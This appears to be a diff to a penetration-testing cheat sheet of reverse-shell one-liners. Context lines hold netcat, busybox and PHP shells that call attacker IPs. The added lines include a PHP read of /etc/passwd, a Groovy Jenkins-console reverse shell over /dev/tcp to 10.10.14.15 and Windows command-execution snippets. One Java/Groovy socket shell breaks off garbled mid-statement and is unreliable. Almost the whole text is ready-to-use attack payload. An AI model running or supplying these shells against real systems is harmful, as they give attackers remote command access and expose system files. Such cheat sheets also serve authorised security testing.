@@ -20,6 +20,7 @@ busybox nc 10.10.10.10 1234 -e /bin/sh
 #### PHP
 
 ```bash
+<?php file_get_contents('/etc/passwd'); ?>
 php -r '$sock=fsockopen("192.168.45.178", 60001);exec("/bin/sh -i <&3 >&3 2>&3");'
 
 cp /usr/share/webshells/php/php-reverse-shell.php .
@@ -179,4 +180,15 @@ system('netcat.exe -vv 192.168.4.178 443 -e cmd.exe');
     });
     return /a/; // Prevents the Node.js application form crashing
 })();
+```
+
+#### Groovy-based - Jenkins Console
+
+```bash
+# Linux
+r = Runtime.getRuntime() p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/10.10.14.15/8443;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[]) p.waitFor()
+# Windows
+def cmd = "cmd.exe /c dir".execute(); println("${cmd.text}");
+# Windows
+String host="localhost"; int port=8044; String cmd="cmd.exe"; Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new So);
 ```
